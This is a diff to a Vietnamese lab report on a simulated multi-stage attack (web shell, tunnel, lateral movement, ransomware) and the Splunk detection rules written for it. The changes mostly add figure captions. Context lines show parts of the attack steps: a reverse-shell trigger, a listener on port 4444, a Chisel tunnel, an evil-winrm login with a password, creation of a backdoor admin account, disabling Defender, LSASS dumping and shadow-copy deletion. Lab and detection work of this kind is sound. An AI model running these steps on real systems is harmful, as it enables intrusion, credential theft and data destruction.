@@ -47,6 +47,7 @@ flowchart LR
 ```
 
 ![Sơ đồ Chuỗi Tấn công Đa tầng](assets/rules/attack_chain_diagram.png)
+*Hình 1.1: Sơ đồ chuỗi tấn công đa tầng (Web Shell -> C2 Tunnel -> Lateral Movement -> Ransomware).* 
 
 ### Bảng phân tích 5W1H và Ma trận Chiến thuật
 
@@ -114,6 +115,7 @@ graph LR
 ```
 
 ![Mô hình Kiến trúc Mạng Lab](assets/rules/topology_overview.png)
+*Hình 1.2: Sơ đồ kiến trúc mạng Lab thực nghiệm kết nối giữa Attacker, Web Server và Target Windows.*
 
 ### Danh mục máy ảo (Virtual Machine Matrix)
 
@@ -276,6 +278,7 @@ New-Item -ItemType Directory -Path "C:\Users\Public\LabData" -Force
 ```
 
 ![Tạo thư mục và file dữ liệu mô phỏng LabData](assets/Script/8_creat_window_folder_file.png)
+*Hình 2.1: Khởi tạo thư mục và tệp tin dữ liệu mô phỏng LabData trên Windows Server.*
 
 Cấu hình file `C:\Program Files\SplunkUniversalForwarder\etc\system\local\inputs.conf`:
 
@@ -320,7 +323,9 @@ python3 -m http.server 8000
 ```
 
 ![Cấu hình IP Kali Attacker](assets/Script/1_ip_kali.png)
+*Hình 3.1: Xác thực cấu hình địa chỉ IP máy tính tấn công Kali Linux.*
 ![Mở Python HTTP server trên Kali](assets/Script/15_open_port_to_download.png)
+*Hình 3.2: Khởi động dịch vụ HTTP Server trên Kali Linux để phát tán payload.*
 
 ---
 
@@ -360,7 +365,9 @@ nikto -h http://192.168.50.20/dvwa/
 ```
 
 ![Nmap quét dải mạng DMZ](assets/Script/2_nmap_subnet.png)
+*Hình 4.1: Quét thăm dò dải mạng DMZ bằng công cụ Nmap từ Kali Linux.*
 ![Nmap quét dịch vụ Web Server Apache](assets/Script/3_nmap_victim_apache.png)
+*Hình 4.2: Quét chi tiết các dịch vụ đang mở trên máy chủ mục tiêu Ubuntu Web Server.*
 
 ---
 
@@ -369,7 +376,9 @@ nikto -h http://192.168.50.20/dvwa/
 - **Mục tiêu**: Vượt qua bộ lọc upload trên DVWA (Security = Low), tải lên `shell.php` và kích hoạt reverse shell tương tác về Kali qua port 4444.
 
 ![Giao diện Web Server DVWA](assets/Script/4_apache_server.png)
+*Hình 4.3: Truy cập giao diện ứng dụng web dễ bị tổn thương DVWA trên Web Server.*
 ![Cấu hình DVWA Security Low](assets/Script/5_low_security.png)
+*Hình 4.4: Thiết lập mức độ bảo mật ứng dụng về Low trong cài đặt DVWA.*
 
 1. **Chuẩn bị payload `shell.php`**:
 ```php
@@ -385,7 +394,9 @@ if(isset($_REQUEST['cmd'])){
 ```
 
 ![Upload file shell.php lên DVWA](assets/Script/6_upload_file_shell.png)
+*Hình 4.5: Khai thác lỗ hổng File Upload tải tệp mã độc shell.php lên máy chủ.*
 ![Kiểm tra đường dẫn file shell.php](assets/Script/7_check_shell.png)
+*Hình 4.6: Kiểm tra đường dẫn lưu trữ tệp shell.php trong thư mục hackable/uploads.*
 
 2. **Lắng nghe kết nối trên Kali**:
 ```bash
@@ -393,6 +404,7 @@ nc -lvnp 4444
 ```
 
 ![Mở Netcat listener port 4444](assets/Script/9_nc_port.png)
+*Hình 4.7: Mở cổng lắng nghe Netcat listener trên cổng 4444 của Kali Linux.*
 
 3. **Kích hoạt reverse TCP shell qua HTTP GET request**:
 ```bash
@@ -401,7 +413,9 @@ curl -G "http://192.168.50.20/dvwa/hackable/uploads/shell.php" \
 ```
 
 ![Gửi request curl kích hoạt Reverse TCP Shell](assets/Script/10_curl_shell.png)
+*Hình 4.8: Kích hoạt Reverse TCP Shell thông qua yêu cầu HTTP cURL.*
 ![Nhận Reverse Shell www-data trên Kali](assets/Script/11_ip_shell_apache.png)
+*Hình 4.9: Nhận thành công phiên tương tác Reverse Shell dưới danh tính www-data.*
 
 ---
 
@@ -437,7 +451,9 @@ cat /var/www/html/dvwa/config/config.inc.php | grep -i "svc_"
 ```
 
 ![Kiểm tra thông tin mạng nội bộ qua ARP/IP Neigh](assets/Script/12_ip_neigh.png)
+*Hình 4.10: Thu thập thông tin mạng nội bộ và các nút láng giềng qua ip neigh.*
 ![Đọc trộm file config.inc.php lấy credential svc_backup](assets/Script/14_show_config_dvwa_account.png)
+*Hình 4.11: Đọc tệp cấu hình config.inc.php trích xuất thông tin đăng nhập svc_backup.*
 
 ---
 
@@ -451,6 +467,7 @@ cat /var/www/html/dvwa/config/config.inc.php | grep -i "svc_"
 ```
 
 ![Khởi chạy Chisel server trên Kali](assets/Script/17_chisel_open_port.png)
+*Hình 4.12: Khởi chạy dịch vụ Chisel Server trên cổng 8000 của Kali Linux.*
 
 2. **Trên Web Server (Chạy Chisel Client kết nối ngược)**:
 ```bash
@@ -460,7 +477,9 @@ chmod +x /tmp/chisel
 ```
 
 ![Tải Chisel binary về Web Server](assets/Script/16_download_chisel.png)
+*Hình 4.13: Tải tệp thực thi Chisel client về máy chủ web Ubuntu.*
 ![Kết nối Chisel client mở Reverse SOCKS5 Proxy](assets/Script/18_connected_chisel_dvwa_apache.png)
+*Hình 4.14: Thiết lập đường hầm Reverse SOCKS5 Proxy kết nối ngược về Kali.*
 
 ---
 
@@ -474,6 +493,7 @@ proxychains nmap -sT -Pn -p 5985,445,3389 192.168.100.30
 ```
 
 ![Quét nmap qua Proxychains tới Windows Server](assets/Script/13_proxychain_nmap_target_window.png)
+*Hình 4.15: Quét cổng máy chủ Windows Server thông qua Proxychains và SOCKS5 tunnel.*
 
 2. **Thiết lập Port Forwarding qua `socat` trên Web Server**:
 ```bash
@@ -481,7 +501,9 @@ socat TCP-LISTEN:5555,fork,reuseaddr TCP:192.168.100.30:5985 &
 ```
 
 ![Khởi chạy Socat Port Forwarding cổng 5555](assets/Script/19_open_port_window.png)
+*Hình 4.16: Cấu hình Socat Port Forwarding chuyển tiếp lưu lượng cổng WinRM 5985 sang 5555.*
 ![Kiểm tra kết nối WinRM qua socat port 5555](assets/Script/20_connect_port_window_rm.png)
+*Hình 4.17: Kiểm tra kết nối dịch vụ WinRM thông qua cổng trung gian 5555.*
 
 ---
 
@@ -495,8 +517,11 @@ evil-winrm -i 192.168.50.20 -u svc_backup -p 'P@ssw0rd2026!' -P 5555
 ```
 
 ![Đăng nhập Evil-WinRM bằng tài khoản svc_backup](assets/Script/21_login_acc_window_rm.png)
+*Hình 4.18: Đăng nhập từ xa thành công vào Windows Server bằng Evil-WinRM với tài khoản svc_backup.*
 ![Kiểm tra hostname và IP Windows Server](assets/Script/22_check_host_ip.png)
+*Hình 4.19: Xác nhận danh tính máy chủ Windows Server (WIN-I370HR7VSPS và IP 192.168.100.20).*
 ![Kiểm tra whoami /all và đặc quyền Administrator](assets/Script/23_whoami_all.png)
+*Hình 4.20: Kiểm tra đặc quyền tài khoản và quyền hạn thành viên Administrators.*
 
 2. **Thực thi trên Remote PowerShell**:
 ```powershell
@@ -505,6 +530,7 @@ net localgroup Administrators backdoor /add
 ```
 
 ![Tạo tài khoản ngầm backdoor và thêm vào Administrators](assets/Script/24_netuser_group.png)
+*Hình 4.21: Tạo tài khoản ngầm backdoor và thêm vào nhóm quản trị viên cục bộ.*
 
 ---
 
@@ -525,6 +551,7 @@ sc.exe start DumpService
 ```
 
 ![Tắt Defender và tạo DumpService trích xuất LSASS](assets/Script/25_creat_dump_backdoor.png)
+*Hình 4.22: Vô hiệu hóa Microsoft Defender và tạo service trích xuất bộ nhớ tiến trình LSASS.*
 
 ---
 
@@ -533,6 +560,7 @@ sc.exe start DumpService
 - **Mục tiêu**: Xóa toàn bộ điểm khôi phục hệ thống (VSS) nhằm triệt tiêu khả năng cứu dữ liệu, sau đó thực thi script PowerShell mã hóa toàn bộ file trong `C:\Users\Public\LabData` bằng thuật toán XOR byte và đổi phần mở rộng thành `.locked`.
 
 ![Trạng thái file trước khi bị mã hóa](assets/Script/26_before_encrypted.png)
+*Hình 4.23: Trạng thái nguyên vẹn của các tệp tin dữ liệu trước khi mã hóa tống tiền.*
 
 ```powershell
 # 1. Xóa sạch Volume Shadow Copies
@@ -549,6 +577,7 @@ Get-ChildItem -Path "C:\Users\Public\LabData" -Recurse -File | ForEach-Object {
 ```
 
 ![Trạng thái file sau khi bị mã hóa đổi đuôi .locked](assets/Script/27_after_encrypted.png)
+*Hình 4.24: Toàn bộ tệp tin trong thư mục dữ liệu bị mã hóa và đổi phần mở rộng thành .locked.*
 
 ---
 
@@ -564,9 +593,11 @@ Get-ChildItem -Path "C:\Users\Public\LabData" -Recurse -File | ForEach-Object {
 ### Rule 01: Web Shell RCE và Malicious URI Query Execution
 
 ![Rule 1 Splunk SPL Query](assets/rules/rule01_webshell_spl.png)
+*Hình 5.1a: Cú pháp truy vấn Splunk SPL phát hiện Web Shell RCE.*
 ![Rule 1 Splunk Kết Quả Tìm Kiếm Thực Tế](assets/rules/rule01_results.png)
+*Hình 5.1b: Kết quả bắt được 52 sự kiện truy vấn shell.php trên Splunk.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1190` (Exploit Public-Facing App), `T1505.003` (Web Shell)
     - **Data Source**: `index=web_logs` (Apache / Nginx Access Logs)
@@ -607,8 +638,9 @@ index=web_logs method IN ("GET","POST") status=200
 ### Rule 02: Linux Cron Persistence via Service Accounts
 
 ![Rule 2 Splunk SPL Query và Kết Quả](assets/rules/rule02_cron_spl.png)
+*Hình 5.2: Kết quả Splunk SPL phát hiện tạo Cron Job duy trì truy cập ngầm.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1053.003` (Scheduled Task/Job: Cron)
     - **Data Source**: `index=linux_security sourcetype=auditd`
@@ -662,8 +694,9 @@ index=linux_security sourcetype=auditd success=yes
 ### Rule 03: Sudo Privilege Escalation và GTFOBins Abuse
 
 ![Rule 3 Splunk SPL Query và Kết Quả](assets/rules/rule03_sudo_spl.png)
+*Hình 5.3: Kết quả Splunk SPL phát hiện leo thang đặc quyền qua lệnh Sudo bất thường.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1548.003` (Abuse Elevation Control Mechanism: Sudo)
     - **Data Source**: `index=linux_security sourcetype=linux_secure` (`/var/log/auth.log`)
@@ -699,8 +732,9 @@ index=linux_security sourcetype=linux_secure "sudo:"
 ### Rule 04: Sensitive Configuration File Access in Non-Interactive Sessions
 
 ![Rule 4 Splunk SPL Query và Kết Quả](assets/rules/rule04_config_spl.png)
+*Hình 5.4: Kết quả Splunk SPL phát hiện đọc trộm tệp tin cấu hình nhạy cảm.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1552.001` (Credentials In Files)
     - **Data Source**: `index=linux_security sourcetype=auditd` (audit key `sensitive_config_read`)
@@ -740,8 +774,9 @@ index=linux_security sourcetype=auditd key=sensitive_config_read success=yes typ
 ### Rule 05: Suspicious Ingress Tool Execution và Tunneling
 
 ![Rule 5 Splunk SPL Query và Kết Quả](assets/rules/rule05_tunnel_spl.png)
+*Hình 5.5: Kết quả Splunk SPL phát hiện khởi chạy công cụ tạo đường hầm Chisel.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1105` (Ingress Tool Transfer), `T1090.001` (Internal Proxy)
     - **Data Source**: `index=linux_security sourcetype=auditd`
@@ -776,7 +811,7 @@ index=linux_security sourcetype=auditd (key=exec_cmds OR key=net_connect OR comm
 
 ### Rule 06: Internal Reconnaissance và Multi-Port Scanning
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1046` (Network Service Discovery)
     - **Data Source**: `index=windows_sysmon EventCode=3` (Network Connection)
@@ -806,9 +841,11 @@ index=windows_sysmon EventCode=3 SourceIp="192.168.100.20"
 ### Rule 07: Suspicious Windows Remote Access / WinRM Authentication
 
 ![Rule 6 Splunk SPL Query](assets/rules/rule06_winrm_spl.png)
+*Hình 5.6a: Cú pháp Splunk SPL phát hiện đăng nhập WinRM từ xa.*
 ![Rule 6 Splunk Kết Quả Tìm Kiếm Thực Tế](assets/rules/rule06_results.png)
+*Hình 5.6b: Kết quả phân tích xác thực WinRM LogonType 3 trên Splunk.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1021.006` (Remote Services: WinRM)
     - **Data Source**: `index=windows_security EventCode=4624 Logon_Type=3`
@@ -848,8 +885,9 @@ index=windows_security EventCode=4624 Logon_Type=3 Logon_Process IN ("NtLmSsp", 
 ### Rule 08: Local Admin Account Creation và Privilege Escalation
 
 ![Rule 7 Splunk SPL Query và Kết Quả](assets/rules/rule07_admin_spl.png)
+*Hình 5.7: Kết quả Splunk SPL phát hiện tạo tài khoản ngầm và gán quyền Administrators.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1136.001` (Create Account: Local Account), `T1098` (Account Manipulation)
     - **Data Source**: `index=windows_security (EventCode=4720 OR EventCode=4732)`
@@ -887,8 +925,9 @@ index=windows_security (EventCode=4720 OR EventCode=4732)
 ### Rule 09: Windows Defender Tampering và Security Evasion
 
 ![Rule 8 Splunk SPL Query và Kết Quả](assets/rules/rule08_defender_spl.png)
+*Hình 5.8: Kết quả Splunk SPL phát hiện hành vi tắt tính năng bảo vệ của Windows Defender.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1562.001` (Impair Defenses: Disable or Modify Tools)
     - **Data Source**: `windows_logs` (Defender 5001 / PowerShell 4104) và `windows_sysmon` (EventCode 1)
@@ -930,8 +969,9 @@ OR (index=windows_sysmon EventCode=1 (Image="*powershell.exe" OR Image="*cmd.exe
 ### Rule 10: LSASS Memory Dumping và Credential Extraction
 
 ![Rule 9 Splunk SPL Query và Kết Quả](assets/rules/rule09_lsass_spl.png)
+*Hình 5.9: Kết quả Splunk SPL phát hiện truy cập trái phép vào bộ nhớ tiến trình LSASS.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1003.001` (OS Credential Dumping: LSASS Memory)
     - **Data Source**: `index=windows_sysmon EventCode=10` (ProcessAccess)
@@ -993,8 +1033,9 @@ index=windows_sysmon (
 ### Rule 11: Volume Shadow Copies (VSS) Deletion
 
 ![Rule 10 Splunk SPL Query và Kết Quả](assets/rules/rule10_vss_spl.png)
+*Hình 5.10: Kết quả Splunk SPL phát hiện lệnh xóa bản sao lưu Volume Shadow Copies.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1490` (Inhibit System Recovery)
     - **Data Source**: `index=windows_sysmon EventCode=1` / `windows_security EventCode=4688`
@@ -1028,9 +1069,11 @@ index=windows_sysmon EventCode=1 (Image="*vssadmin.exe" OR Image="*wmic.exe" OR 
 ### Rule 12: Ransomware Mass File Encryption Activity
 
 ![Rule 11 Splunk SPL Query](assets/rules/rule11_encryption_spl.png)
+*Hình 5.11a: Cú pháp Splunk SPL phát hiện hành vi mã hóa hàng loạt tệp tin.*
 ![Rule 11 Splunk Kết Quả Tìm Kiếm Thực Tế](assets/rules/rule11_results.png)
+*Hình 5.11b: Kết quả phát hiện tạo hàng loạt tệp có phần mở rộng .locked.*
 
-!!! info "Metadata Box"
+??? note "Metadata Box"
 
     - **MITRE ATT&CK**: `T1486` (Data Encrypted for Impact)
     - **Data Source**: `index=windows_sysmon EventCode=11` (FileCreate / Rename)
